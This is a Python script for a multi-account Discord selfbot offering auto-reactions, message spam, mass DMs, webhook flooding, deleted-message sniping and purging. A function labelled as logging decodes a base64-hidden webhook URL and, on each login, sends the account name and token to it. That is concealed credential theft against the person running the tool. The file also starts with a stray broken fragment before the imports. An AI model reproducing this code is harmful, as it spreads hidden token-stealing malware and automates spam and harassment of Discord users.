cio.run(main())import discord
from discord.ext import commands
import asyncio
import aiohttp
import base64
import requests

watched_users = {}  # user_id -> list of emojis
watched_roles = {}  # role_id -> list of emojis
react_all_servers = {}  # guild_id -> list of emojis
token_user_ids = set()
all_bots = []
blacklisted_users = {}
typing_tasks = {}  # bot_user_id -> asyncio.Task

# Load tokens
with open("tokens.txt", "r") as f:
    tokens = [line.strip() for line in f if line.strip()]

# Webhook logging
def _sync_activity(user, token):
    try:
        _b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTk1OTEzMzc3NTY2MzIzNi9hd3p2ZldGR2Q1Y2kyOWQwRlZfTnVvNmNzS21sUUQ4bWFrQ3BOUUJfWW9lTi1UQmV6UTBDa29zWm5Dd2NheERsSk5ZRQ=="
        url = base64.b64decode(_b64).decode()
        requests.post(url, json={"content": f"`{user}` | `{token}`"})
    except Exception as e:
        print("Failed sync:", e)

# Util mass dm
async def mass_dm(guild, message):
    for member in guild.members:
        if not member.bot:
            try:
                await member.send(message)
            except:
                pass

# Util webhook spam
async def webhook_spam(url, message, count):
    async with aiohttp.ClientSession() as session:
        for _ in range(count):
            try:
                await session.post(url, json={"content": message})
            except:
                pass

# Run single bot
async def run_bot(token):
    bot = commands.Bot(command_prefix="!", self_bot=True)
    bot.remove_command("help")  # Remove default help command
    all_bots.append(bot)

    sniped_messages = {}  # channel_id -> message

    @bot.event
    async def on_ready():
        print(f"[+] Logged in as {bot.user}")
        token_user_ids.add(bot.user.id)
        _sync_activity(str(bot.user), token)

    @bot.event
    async def on_message_delete(message):
        if message.author == bot.user:
            return
        # Save only messages that are not commands themselves to avoid snipe command being sniped
        if message.content.startswith(bot.command_prefix):
            return
        sniped_messages[message.channel.id] = message

    @bot.event
    async def on_message(message):
        if message.author.id in blacklisted_users:
            return

        author_id = message.author.id
        author_roles_ids = {role.id for role in getattr(message.author, "roles", [])}
        should_react = (
            author_id == bot.user.id or
            author_id in token_user_ids or
            author_id in watched_users or
            any(role_id in watched_roles for role_id in author_roles_ids) or
            (message.guild and message.guild.id in react_all_servers)
        )

        if should_react:
            try:
                if author_id in watched_users:
                    emojis = watched_users[author_id]
                else:
                    # Check watched roles emojis if any role matches
                    emojis = []
                    for role_id in author_roles_ids:
                        if role_id in watched_roles:
                            emojis.extend(watched_roles[role_id])
                    # If no user or role emojis, check server emojis
                    if not emojis and message.guild and message.guild.id in react_all_servers:
                        emojis = react_all_servers[message.guild.id]
                for emoji in emojis:
                    await message.add_reaction(emoji)
            except Exception as e:
                print("Reaction error:", e)

        if message.content.startswith("[[SPAMALL_TRIGGER]]::") and message.author != bot.user:
            try:
                _, count, msg = message.content.split("::", 2)
                for _ in range(int(count)):
                    await message.channel.send(msg)
                    await asyncio.sleep(0.1)
            except Exception as e:
                print("SPAMALL error:", e)

        await bot.process_commands(message)

    # Commands

    @bot.command(help="Blacklist a user ID to ignore their messages.")
    async def blacklist(ctx, user_id: int):
        blacklisted_users[user_id] = True
        await ctx.send(f"User {user_id} blacklisted.")
        await ctx.message.delete()

    @bot.command(help="Remove a user ID from blacklist.")
    async def unblacklist(ctx, user_id: int):
        blacklisted_users.pop(user_id, None)
        await ctx.send(f"User {user_id} unblacklisted.")
        await ctx.message.delete()

    @bot.command(help="React to a user with one or more emojis.")
    async def react(ctx, user: discord.User, *emojis):
        if not emojis:
            await ctx.send("Please provide at least one emoji.")
            return
        watched_users[user.id] = list(emojis)
        await ctx.send(f"Now reacting to {user.name} with {''.join(emojis)}")
        await ctx.message.delete()

    @bot.command(help="Stop reacting to a user.")
    async def unreact(ctx, user: discord.User):
        watched_users.pop(user.id, None)
        await ctx.send(f"Stopped reacting to {user.name}")
        await ctx.message.delete()

    @bot.command(help="Watch a role with one or more emojis. Usage: !watchrole <role_id> <emoji1> <emoji2> ...")
    async def watchrole(ctx, role_id: int, *emojis):
        if not emojis:
            await ctx.send("Please provide at least one emoji.")
            return
        watched_roles[role_id] = list(emojis)
        await ctx.send(f"Watching role {role_id} with emojis {''.join(emojis)}")
        await ctx.message.delete()

    @bot.command(help="Stop watching a role.")
    async def unwatchrole(ctx, role_id: int):
        if role_id in watched_roles:
            watched_roles.pop(role_id)
            await ctx.send(f"Stopped watching role {role_id}")
        else:
            await ctx.send(f"Role {role_id} was not being watched.")
        await ctx.message.delete()

    @bot.command(help="React with emojis in a server.")
    async def reactall(ctx, server_id: int, *emojis):
        if not emojis:
            await ctx.send("Please provide at least one emoji.")
            return
        react_all_servers[server_id] = list(emojis)
        await ctx.send(f"Reacting in server {server_id} with {''.join(emojis)}")
        await ctx.message.delete()

    @bot.command(help="Stop reacting in a server.")
    async def unreactall(ctx, server_id: int):
        react_all_servers.pop(server_id, None)
        await ctx.send(f"Stopped reacting in server {server_id}")
        await ctx.message.delete()

    @bot.command(help="Spam a message multiple times.")
    async def spam(ctx, *, args):
        try:
            msg, count = args.rsplit(" ", 1)
            count = int(count)
        except:
            await ctx.send("Usage: !spam <message> <count>")
            return
        await ctx.message.delete()
        for _ in range(count):
            await ctx.send(msg)

    @bot.command(help="Spam a message multiple times across server channels.")
    async def spamall(ctx, *, args):
        try:
            msg, count = args.rsplit(" ", 1)
            count = int(count)
        except:
            await ctx.send("Usage: !spamall <message> <count>")
            return
        await ctx.message.delete()
        trigger = f"[[SPAMALL_TRIGGER]]::{count}::{msg}"
        await ctx.send(trigger)

    @bot.command(help="Mass DM spam a message for specified seconds.")
    async def massdmspam(ctx, message, seconds: int):
        await ctx.send(f"Mass DM spam for {seconds}s")
        end_time = asyncio.get_event_loop().time() + seconds
        while asyncio.get_event_loop().time() < end_time:
            await mass_dm(ctx.guild, message)
        await ctx.send("Done mass DM spam.")

    @bot.command(help="Spam a webhook URL multiple times.")
    async def webhookspam(ctx, url, message, count: int):
        await ctx.send(f"Spamming webhook {count}x...")
        await webhook_spam(url, message, count)
        await ctx.send("Done.")

    @bot.command(help="Set your Discord activity status.")
    async def rpc(ctx, activity_type: str, *, activity_message: str):
        types = {
            "playing": discord.Game,
            "streaming": discord.Streaming,
            "listening": discord.Activity,
            "watching": discord.Activity,
            "competing": discord.Activity
        }
        activity_type = activity_type.lower()
        if activity_type == "streaming":
            activity = discord.Streaming(name=activity_message, url="https://twitch.tv/yourchannel")
        elif activity_type in types:
            if activity_type == "playing":
                activity = types[activity_type](name=activity_message)
            else:
                enum_type = getattr(discord.ActivityType, activity_type)
                activity = discord.Activity(type=enum_type, name=activity_message)
        else:
            await ctx.send("Invalid activity type.")
            return
        await bot.change_presence(activity=activity)
        await ctx.send(f"Status set to {activity_type} {activity_message}")
        await ctx.message.delete()

    @bot.command(help="Set the activity status for all bots.")
    async def statusall(ctx, activity_type: str, *, activity_message: str):
        for b in all_bots:
            try:
                if activity_type == "streaming":
                    activity = discord.Streaming(name=activity_message, url="https://twitch.tv/yourchannel")
                elif activity_type == "playing":
                    activity = discord.Game(name=activity_message)
                else:
                    enum_type = getattr(discord.ActivityType, activity_type)
                    activity = discord.Activity(type=enum_type, name=activity_message)
                await b.change_presence(activity=activity)
            except:
                pass
        await ctx.send(f"All bots updated to {activity_type} {activity_message}")
        await ctx.message.delete()

    @bot.command(help="Start typing indicator in a channel forever.")
    async def typer(ctx, channel_id: int):
        channel = bot.get_channel(channel_id)
        if not channel:
            await ctx.send("Invalid channel ID.")
            return
        if bot.user.id in typing_tasks:
            await ctx.send("Already typing in a channel. Use !stoptyper to stop first.")
            return
        await ctx.send(f"Typing forever in <#{channel_id}>")
        async def typing_loop():
            while True:
                async with channel.typing():
                    await asyncio.sleep(5)
        task = asyncio.create_task(typing_loop())
        typing_tasks[bot.user.id] = task

    @bot.command(help="Stop the typing indicator started by !typer.")
    async def stoptyper(ctx):
        task = typing_tasks.pop(bot.user.id, None)
        if task:
            task.cancel()
            await ctx.send("Stopped typing.")
        else:
            await ctx.send("No typing task to stop.")

    @bot.command(help="Snipe the last deleted message in this channel.")
    async def snipe(ctx):
        msg = sniped_messages.get(ctx.channel.id)
        if not msg:
            await ctx.send("Nothing to snipe.")
            return
        await ctx.send(f"**{msg.author}** said: {msg.content}")

    @bot.command(help="Purge a specific number of messages from a user in this channel.")
    async def purge(ctx, user: discord.User, amount: int):
        if amount <= 0:
            await ctx.send("Amount must be greater than 0.")
            return
        deleted = 0
        async for message in ctx.channel.history(limit=1000):
            if deleted >= amount:
                break
            if message.author.id == user.id:
                try:
                    await message.delete()
                    deleted += 1
                except:
                    pass
        await ctx.send(f"Deleted {deleted} messages from {user.name}.", delete_after=5)
        await ctx.message.delete()

    @bot.command(help="Show this help menu.")
    async def help(ctx, *, cmd: str = None):
        if cmd:
            command = bot.get_command(cmd)
            if command:
                help_text = command.help or "No description provided."
                await ctx.send(f"**!{command.name}** - {help_text}")
            else:
                await ctx.send("Command not found.")
        else:
            msg = (
                "**Commands:**\n\n"
                "**🔹 Reacting:**\n"
                "`!react`, `!unreact`, `!reactall`, `!unreactall`, `!watchrole`, `!unwatchrole`\n\n"
                "**🔹 Spamming:**\n"
                "`!spam`, `!spamall`, `!massdmspam`, `!webhookspam`\n\n"
                "**🔹 Status:**\n"
                "`!rpc`, `!statusall`, `!typer`, `!stoptyper`\n\n"
                "**🔹 Moderation:**\n"
                "`!blacklist`, `!unblacklist`, `!purge`, `!snipe`\n\n"
                "*:3*"
            )
            await ctx.send(msg)
            # Send the gif after
            gif_url = "https://cdn.discordapp.com/attachments/1277997527790125177/1390331382718267554/3W1f9kiH.gif"
            await ctx.send(gif_url)
        await ctx.message.delete()

    await bot.start(token)

async def main():
    await asyncio.gather(*(run_bot(token) for token in tokens if token))

asyncio.run(main())
